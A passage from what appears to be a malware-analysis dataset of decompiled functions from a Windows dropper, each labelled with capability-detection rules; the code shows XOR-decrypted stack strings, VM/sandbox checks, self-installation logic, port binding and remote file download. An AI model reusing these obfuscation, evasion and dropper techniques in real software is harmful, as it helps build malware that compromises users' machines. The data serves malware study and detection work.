0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            puVar7 = puVar6;\n            for (iVar10 = lpcchSize * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            piVar17 = lpProfileDir;\n            for (iVar10 = lpcchSize * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *piVar17 = 0;\n                piVar17 = piVar17 + 1;\n            }\n            iVar10 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n            if (iVar10 != 0) {\n                iVar10 = puVar6 - piVar5;\n                do {\n                    iVar2 = *piVar5;\n                    *(iVar10 + piVar5) = iVar2;\n                    piVar5 = piVar5 + 1;\n                } while (iVar2 != 0);\n                var_58h = 0x49734e2a;\n                var_54h = 0x76697317;\n                var_50h._0_2_ = 0x594e;\n                var_10h = 0x49594e76;\n                var_ch._0_2_ = 0x7339;\n                var_ch._2_1_ = 0x43;\n                fcn.00401000(0x14);\n                puVar16 = lpMem;\n                iVar10 = 0;\n                var_cch = 7;\n                do {\n                    puVar1 = iVar10 + lpMem;\n                    iVar12 = iVar10 % 7;\n                    iVar10 = iVar10 + 1;\n                    *puVar1 = *(&var_10h + iVar12) ^ puVar1[&var_58h - lpMem];\n                } while (iVar10 < 10);\n                fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > IsMagicTempFileExists : decrypt (wide char) %s -> %ws\", 0xb2);\n                piVar5 = lpProfileDir;\n                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puVar13 = puVar16;\n                do {\n                    iVar2 = *puVar13;\n                    puVar13 = puVar13 + 2;\n                } while (iVar2 != 0);\n                puVar18 = lpFileName + -2;\n                do {\n                    piVar17 = puVar18 + 2;\n                    puVar18 = puVar18 + 2;\n                } while (*piVar17 != 0);\n                puVar15 = puVar16;\n                for (uVar11 = puVar13 - puVar16 >> 2; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    *puVar18 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    puVar18 = puVar18 + 1;\n                }\n                for (uVar11 = puVar13 - puVar16 & 3; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    *puVar18 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    puVar18 = puVar18 + 1;\n                }\n                fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > IsMagicTempFileExists : szUsersDirecoryPath : %ws\", 0xb5);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_60h = 0x3177534c;\n                    var_68h = 0x31775362;\n                    var_64h._0_2_ = 0x7038;\n                    var_64h._2_1_ = 0x33;\n                    var_10h = 0x707e705f;\n                    var_ch._0_2_ = 0x4246;\n                    var_80h = 0x70507071;\n                    var_7ch = 0x47614246;\n                    do {\n                        fcn.00401000(8);\n                        iVar10 = var_c4h;\n                        var_4h = 0;\n                        do {\n                            *(var_4h + var_c4h) =\n                                 *(&var_68h + var_4h % var_cch) ^ (var_4h + var_c4h)[&var_60h - var_c4h];\n                            var_4h = var_4h + 1;\n                        } while (var_4h < 4);\n                        fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > IsMagicTempFileExists : decrypt (wide char) %s -> %ws\"\n                                     , 0xbc);\n                        fcn.00401000(0xc);\n                        iVar12 = var_bch;\n                        uVar11 = 0;\n                        do {\n                            puVar1 = uVar11 + var_bch;\n                            uVar8 = uVar11 & 0x80000007;\n                            if (uVar8 < 0) {\n                                uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n                            }\n                            uVar11 = uVar11 + 1;\n                            *puVar1 = *(&var_80h + uVar8) ^ puVar1[&var_10h - var_bch];\n                        } while (uVar11 < 6);\n                        fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > IsMagicTempFileExists : decrypt (wide char) %s -> %ws\"\n                                     , 0xbd);\n                        iVar9 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar10);\n                        pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar9 != 0) &&\n                            (iVar9 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar12),  iVar9 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > IsMagicTempFileExists : USERNAME : %ws\", 0xc6);\n                            var_38h = 0x540d4d15;\n                            var_34h._0_2_ = 0x6531;\n                            var_34h._2_1_ = 0x55;\n                            stack0xffffffcb = 0x424d3556;\n                            stack0xffffffcf = 0x51650154;\n                            stack0xffffffd3 = 0x164d2d56;\n                            stack0xffffffd7 = 0x5a653b54;\n                            stack0xffffffdb = 0x114d3e56;\n                            stack0xffffffdf = 0x60650e54;\n                            stack0xffffffe3 = 0xf4d3c56;\n                            stack0xffffffe7 = 0x34652254;\n                            var_14h._3_1_ = 0x56;\n                            var_78h = 0x54624d59;\n                            var_74h = 0x56346552;\n                            fcn.00401000(0x50);\n                            iVar10 = var_c8h;\n                            uVar11 = 0;\n                            do {\n                                puVar1 = uVar11 + var_c8h;\n                                uVar8 = uVar11 & 0x80000007;\n                                if (uVar8 < 0) {\n                                    uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n                                }\n                                uVar11 = uVar11 + 1;\n                                *puVar1 = *(&var_78h + uVar8) ^ puVar1[&var_38h - var_c8h];\n                            } while (uVar11 < 0x28);\n                            fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > IsMagicTempFileExists : decrypt (wide char) %s -> %ws\"\n                                         , 0xc9);\n                            var_b0h = 0x311f632e;\n                            var_ach = 0x390a661d;\n                            var_a8h = 0x311b630e;\n                            var_a4h = 0x3912660c;\n                            var_a0h = 0x31006323;\n                            var_9ch = 0x392f660e;\n                            var_98h = 0x31336303;\n                            var_94h = 0x392b6639;\n                            var_90h = 0x311f6302;\n                            var_8ch._0_2_ = 0x666d;\n                            var_88h = 0x316f636f;\n                            var_84h = 0x394e666d;\n                            fcn.00401000(0x4c);\n                            iVar12 = var_c0h;\n                            uVar11 = 0;\n                            do {\n                                puVar1 = uVar11 + var_c0h;\n                                uVar8 = uVar11 & 0x80000007;\n                                if (uVar8 < 0) {\n                                    uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n                                }\n                                uVar11 = uVar11 + 1;\n                                *puVar1 = *(&var_88h + uVar8) ^ puVar1[&var_b0h - var_c0h];\n                            } while (uVar11 < 0x26);\n                            fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > IsMagicTempFileExists : decrypt (wide char) %s -> %ws\"\n                                         , 0xca);\n                            piVar5 = lpProfileDir;\n                            var_58h = iVar12;\n                            var_54h = iVar10;\n                            var_4h = 0;\n                            var_70h = 0x4a57424c;\n                            var_6ch = 0x52747166;\n                            do {\n                                var_40h = 0x4a244269;\n                                var_3ch = 0x5251713a;\n                                var_38h = 0x4a0b423f;\n                                var_34h._0_2_ = 0x7143;\n                                var_34h._2_1_ = 7;\n                                stack0xffffffcb = 0x22421052;\n                                stack0xffffffcf = 0x1e71174a;\n                                stack0xffffffd3 = 0x3c422f52;\n                                stack0xffffffd7 = 0x1371034a;\n                                stack0xffffffdb = 0x3f423952;\n                                stack0xffffffdf = 0x5a710a4a;\n                                stack0xffffffe3 = 0x3a423852;\n                                stack0xffffffe7 = 0x7471164a;\n                                var_14h._3_1_ = 0x52;\n                                fcn.00401000(0x60);\n                                iVar10 = var_d0h;\n                                uVar11 = 0;\n                                do {\n                                    puVar1 = uVar11 + var_d0h;\n                                    uVar8 = uVar11 & 0x80000007;\n                                    if (uVar8 < 0) {\n                                        uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n                                    }\n                                    uVar11 = uVar11 + 1;\n                                    *puVar1 = *(&var_70h + uVar8) ^ puVar1[&var_40h - var_d0h];\n                                } while (uVar11 < 0x30);\n                                pcVar20 = \"wszMagicTempFileTemplate_EncryptedStackedBuffer\";\n                                uVar4 = 0xd4;\n                                pcVar19 = \n                                \"GTK DLL: uninstall.cpp:%d > IsMagicTempFileExists : decrypt (wide char) %s -> %ws\";\n                                iVar12 = var_d0h;\n                                fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > IsMagicTempFileExists : decrypt (wide char) %s -> %ws\"\n                                             , 0xd4);\n                                (*_sym.imp.USER32.dll_wsprintfW)\n                                          (ARG_0, iVar10, piVar5, &lpString1, (&var_58h)[var_4h], pcVar19, uVar4, \n                                           pcVar20, iVar12);\n                                fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > IsMagicTempFileExists : TEMPPATH : %ws\", 0xda)\n                                ;\n                                iVar12 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(ARG_0);\n                                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                if (iVar12 != -1) {\n                                    fcn.00407516();\n                                    var_b8h = 1;\n                                }\n                                uVar4 = (*pcVar14)(0, iVar10);\n                                pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                                var_4h = var_4h + 1;\n                            } while (var_4h < 2);\n                            uVar4 = (*pcVar14)(0, var_c0h);\n                            (*pcVar3)(uVar4);\n                            uVar4 = (*pcVar14)(0, var_c8h);\n                            (*pcVar3)(uVar4);\n                            iVar12 = var_bch;\n                            iVar10 = var_c4h;\n                        }\n                        uVar4 = (*pcVar14)(0, iVar12);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                        uVar4 = (*pcVar14)(0, iVar10);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                        piVar5 = lpProfileDir;\n                    } while (iVar10 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar4 = (*pcVar14)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                puVar6 = lpFileName;\n            }\n        }\n        if (puVar6 != NULL) {\n            uVar4 = (*pcVar14)(0, puVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        if (piVar5 != NULL) {\n            uVar4 = (*pcVar14)(0, piVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        if (ARG_0 != NULL) {\n            uVar4 = (*pcVar14)(0, ARG_0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return var_b8h;\n}\n",
        "token_count": 4315
    },
    "0040ff4f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040ff4f(void)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0xaea3ed09;\n    uVar1 = 0;\n    var_20h = 0x2993125a;\n    var_1ch = 0x3d75a3ff;\n    var_18h = 0x662d9d39;\n    var_14h = 0x922df04;\n    var_10h = 0xc84f40f0;\n    var_ch = 0xdcfc6e80;\n    do {\n        var_8h = (&var_24h)[uVar1];\n        var_4h = 0;\n        fcn.0040a6ae();\n        if (var_4h == 0) {\n            fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > CheckSpamHausRooster : BrowserNames[%d] -> 0x%08x : not found\"\n                         , 0x14a);\n            return 0;\n        }\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > CheckSpamHausRooster : BrowserNames[%d] -> 0x%08x : found\", 0x14e);\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 7);\n    return 1;\n}\n",
        "token_count": 375
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_14h;\n    uchar *lpDst;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    var_4h = 0;\n    uVar4 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar2)(uVar4 | 2);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)(&var_4h);\n    var_8h = (*_sym.imp.SHELL32.dll_CommandLineToArgvW)(uVar5);\n    if ((var_8h != 0) && (iVar9 = 0,  0 < var_4h)) {\n        do {\n            fcn.00403bde(\"GTK DLL: WinMain.cpp:%d > WinMain : arg %d : %ws\", 0x49);\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < var_4h);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    uVar5 = (*pcVar2)(0, 0x208);\n    lpDst = (*pcVar3)(uVar5);\n    iVar9 = 0;\n    puVar10 = puVar6;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, puVar6, 0x104);\n    *0x427d40 = puVar6;\n    (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    iVar7 = fcn.00407c7d();\n    if (iVar7 != 1) goto code_r0x004101da;\n    fcn.00409c4c();\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    iVar7 = iVar9;\n    while( true ) {\n        while( true ) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(iVar7);\ncode_r0x004101da:\n            iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(puVar6, L\"mstsc.exe\");\n            if (iVar7 != 0) break;\n            puVar10 = puVar6;\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(iVar9);\n            fcn.0040968c(puVar10);\n            iVar7 = iVar9;\n        }\n        if (1 < var_4h) {\n            *0x427d40 = *(var_8h + 4);\n        }\n        *0x427d7c = fcn.004100dd();\n        fcn.00403bde(\"GTK DLL: WinMain.cpp:%d > WinMain : g_CurrentModule : %p\", 0x73);\n        fcn.0040a60c();\n        fcn.0040ffe1();\n        var_68h = 0x6427764f;\n        var_64h = 0x6a033724;\n        var_60h = 0x74256632;\n        var_5ch = 0x762b5363;\n        var_58h = 0x37286443;\n        var_54h = 0x661f6a1e;\n        var_ch = 7;\n        var_50h._0_1_ = 7;\n        stack0xffffffad = 0x5534574;\n        var_4bh = 0x1b641576;\n        var_47h = 0x26a3537;\n        var_43h = 0x7e743866;\n        var_3fh = 0x12760453;\n        var_3bh = 0x21371164;\n        var_37h = 0x166186a;\n        var_33h = 0x4a534374;\n        var_2fh = 0xc642376;\n        var_2bh = 0x1a6a2337;\n        var_27h = 0x45740b66;\n        var_23h = 0x14760f53;\n        var_1fh = 0x53372864;\n        var_1bh._0_1_ = 0x6a;\n        stack0xffffffe4 = 0x6466766a;\n        var_14h._0_2_ = 0x3774;\n        var_14h._2_1_ = 0x53;\n        fcn.00401000(0x9c);\n        iVar7 = var_8h;\n        do {\n            puVar1 = iVar9 + var_8h;\n            iVar8 = iVar9 % var_ch;\n            iVar9 = iVar9 + 1;\n            *puVar1 = *(&var_1bh + iVar8 + 3) ^ puVar1[&var_68h - var_8h];\n        } while (iVar9 < 0x4e);\n        fcn.00403bde(\"GTK DLL: WinMain.cpp:%d > WinMain : decrypt (wide char) %s -> %ws\", 0x79);\n        puVar6 = lpDst;\n        puVar10 = lpDst;\n        for (iVar9 = 0x208; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *puVar10 = 0;\n            puVar10 = puVar10 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar7, lpDst, 0x104);\n        fcn.00403bde(\"GTK DLL: WinMain.cpp:%d > WinMain : szCurrentExecutablePath : %ws\", 0x80);\n        fcn.00403bde(\"GTK DLL: WinMain.cpp:%d > WinMain : wszFullExename : %ws\", 0x81);\n        iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x427d40, puVar6);\n        if (iVar9 != 0) break;\n        fcn.00403bde(\"GTK DLL: WinMain.cpp:%d > WinMain : seems like EXE not installed yet\", 0x8c);\n        fcn.00406c4d();\n        iVar9 = iVar7;\n        iVar7 = 0;\n    }\n    fcn.00403bde(\"GTK DLL: WinMain.cpp:%d > WinMain : seems like EXE installed already, begin work now\", 0x85);\n    uVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00405857, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    return;\n}\n",
        "token_count": 1876
    },
    "00403ae3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403ae3(char *param_1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint *puVar6;\n    uint lpFileName;\n    uint var_4h;\n    \n    pcVar5 = param_1;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    var_4h = 0;\n    puVar6 = &lpFileName;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsA)(\"%TEMP%\\\\EventsLog.txt\", &lpFileName, 0x104);\n    iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileA)(&lpFileName, 4, 0, 0, 4, 0x80, 0);\n    pcVar2 = _sym.imp.KERNEL32.dll_WriteFile;\n    if (iVar4 != -1) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar4, param_1, pcVar5 - (param_1 + 1), &var_4h, 0);\n        if (iVar3 == 0) {\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"Terminal failure: Unable to write to file.\\n\");\n        }\n        else {\n            (*pcVar2)(iVar4, 0x412ae4, 2, &var_4h, 0);\n        }\n        (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(iVar4);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    }\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(param_1);\n    return;\n}\n",
        "token_count": 451
    },
    "00404735": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004047a5)\n\nuint __fastcall fcn.00404735(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    do {\n        var_4h = 0;\n        var_8h = 0;\n        iVar2 = fcn.0040461b(param_2 * 10, 0, &var_8h, &var_4h);\n        iVar1 = var_8h;\n        if (iVar2 == 0) {\n            fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GetRemoteFileHash : BytesDownloaded = %d, ContentLength = %d\", \n                         0x35);\n            if (var_4h == iVar1) {\n                fcn.0040cff1();\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 5);\n    return 0xffffffff;\n}\n",
        "token_count": 301
    },
    "004056c3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004056c3(void)\n\n{\n    uint8_t *puVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint16_t extraout_var;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint uStack480;\n    uchar *puStack476;\n    uint uStack460;\n    uint uStack456;\n    int32_t iStack452;\n    uint uStack448;\n    uchar auStack408 [404];\n    \n    puStack476 = auStack408;\n    uVar7 = 0;\n    uStack480 = 0x202;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    iStack452 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 0);\n    if (iStack452 == -1) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GetFreePortToListen : socket invalid, le = %d\", 0x1af);\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar7 = iVar3 + 2000U & 0xffff;\n        if (uVar7 < 64000) {\n            uStack460 = CONCAT22(uStack460._2_2_, 0x6b65);\n            puStack476 = 0x42676b54;\n            do {\n                fcn.00401000(10);\n                uVar5 = uStack456;\n                uVar6 = 0;\n                do {\n                    puVar1 = uVar6 + uStack460;\n                    uVar4 = uVar6 & 0x80000007;\n                    if (uVar4 < 0) {\n                        uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar6 = uVar6 + 1;\n                    *puVar1 = *(&uStack480 + uVar4) ^ puVar1[&stack0xfffffe28 + -uStack460];\n                } while (uVar6 < 10);\n                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GetFreePortToListen : decrypt (char) %s -> %s\", 0x1a0);\n                uStack448 = (*_sym.imp.WS2_32.dll_inet_addr)(uStack460);\n                uVar2 = (*_sym.imp.WS2_32.dll_ntohs)(uVar7);\n                uStack456 = CONCAT22(uVar2, 2);\n                iVar3 = (*_sym.imp.WS2_32.dll_bind)(uVar5, &uStack456, 0x10);\n                if (iVar3 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(uVar5);\n                    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uStack460);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                    break;\n                }\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GetFreePortToListen : bind error, le = %d\", 0x1aa);\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uStack460);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < 64000);\n        }\n    }\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GetFreePortToListen : port : %d\", 0x1b2);\n    return uVar7 & 0xffff | extraout_var << 0x10;\n}\n",
        "token_count": 883
    },
    "00406ef1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406ef1(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.00406e7e();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x00406f93;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x00406f93;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x00406f93:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 608
    },
    "00406fd5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00406fd5(uint lpLastWriteTime)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint in_EDX;\n    uint32_t uVar8;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint lpSystemTime;\n    uint var_22h;\n    int16_t var_1eh;\n    int16_t var_1ch;\n    int16_t var_1ah;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    iVar3 = *0x427ccc;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar2 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    uVar8 = iVar3 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar8 % 0xb + 1;\n    uVar8 = uVar8 * 0x19660d + 0x3c6ef35f;\n    uVar7 = uVar8 * 0x19660d + 0x3c6ef35f;\n    var_22h._0_2_ = uVar8 % 0x1b + 1;\n    var_22h._2_2_ = uVar7 % 0x16 + 1;\n    uVar8 = uVar7 * 0x19660d + 0x3c6ef35f;\n    uVar7 = uVar8 * 0x19660d + 0x3c6ef35f;\n    var_1eh = uVar8 % 0x3b + 1;\n    var_1ch = uVar7 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1ah = ((uVar7 * 0x19660d + 0x3c6ef35f) * 0x19660d + 0x3c6ef35f) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar2)(&lpSystemTime);\n    (*pcVar2)(&lpSystemTime, lpLastWriteTime);\n    var_5ch = 0x71184560;\n    var_58h = 0x48206e3d;\n    var_54h = 0x71064521;\n    var_50h = 0x486b6e26;\n    var_4ch = 0x711c4519;\n    var_48h = 0x483d6e2d;\n    var_44h = 0x710a4531;\n    var_40h = 0x487d6e39;\n    var_3ch = 0x71334577;\n    var_38h = 0x48236e37;\n    var_34h = 0x71414521;\n    var_30h = 0x48366e31;\n    var_2ch = 0x716f4520;\n    var_18h = 0x716f4545;\n    var_14h = 0x484e6e54;\n    fcn.00401000(0x68);\n    uVar8 = 0;\n    do {\n        puVar1 = uVar8 + var_10h;\n        uVar7 = uVar8 & 0x80000007;\n        if (uVar7 < 0) {\n            uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n        }\n        uVar8 = uVar8 + 1;\n        *puVar1 = *(&var_18h + uVar7) ^ 